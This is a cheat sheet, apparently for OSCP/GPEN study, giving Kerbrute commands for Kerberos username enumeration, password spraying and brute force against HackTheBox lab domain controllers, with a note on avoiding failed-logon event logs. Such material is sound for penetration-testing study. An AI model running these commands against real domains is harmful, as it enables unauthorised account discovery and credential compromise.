# Kerbrute Cheat Sheet (OSCP / GPEN)

## Overview

**Kerbrute** is a fast Kerberos pre-authentication attack tool used to:

- Enumerate valid domain usernames
- Password spray against Kerberos
- Brute-force passwords
- Enumerate user accounts without generating Windows event logs for failed logons (Kerberos pre-authentication behavior differs from SMB/LDAP authentication)

Repository:

https://github.com/ropnop/kerbrute

---

# Basic Syntax

```bash
kerbrute <command> [options]
```

---

# Enumerate Valid Usernames

## Single User

```bash
kerbrute userenum --dc 10.10.10.161 -d htb.local username
```

Example:

```bash
kerbrute userenum --dc 10.10.10.161 -d htb.local svc-alfresco
```

---

## Username List

```bash
kerbrute userenum --dc 10.10.10.161 -d htb.local users.txt
```

Example:

```bash
kerbrute userenum --dc 10.10.10.161 -d megabank.local usernames.txt
```

---

# Password Spray

Try one password against many users.

```bash
kerbrute passwordspray --dc 10.10.10.161 -d htb.local users.txt Password123!
```

Example:

```bash
kerbrute passwordspray --dc 10.10.10.161 -d htb.local users.txt Welcome1
```

Useful after:

- LDAP enumeration
- SMB enumeration
- Email harvesting

---

# Brute Force a Single User

```bash
kerbrute bruteuser --dc 10.10.10.161 -d htb.local passwords.txt administrator
```

---

# Brute Force Multiple Users

```bash
kerbrute bruteforce --dc 10.10.10.161 -d htb.local users.txt passwords.txt
```

Rarely used during OSCP due to lockout policies.

---

# Output to File

```bash
kerbrute userenum --dc 10.10.10.161 -d htb.local users.txt -o valid_users.txt
```

---

# Increase Threads

```bash
kerbrute userenum --threads 20 --dc 10.10.10.161 -d htb.local users.txt
```

Default works well in most environments.

---

# Common Parameters

| Parameter | Description |
|------------|-------------|
| `-d` | Domain |
| `--dc` | Domain Controller IP |
| `--threads` | Number of threads |
| `-o` | Output file |
| `-v` | Verbose |
| `--delay` | Delay between attempts |

---
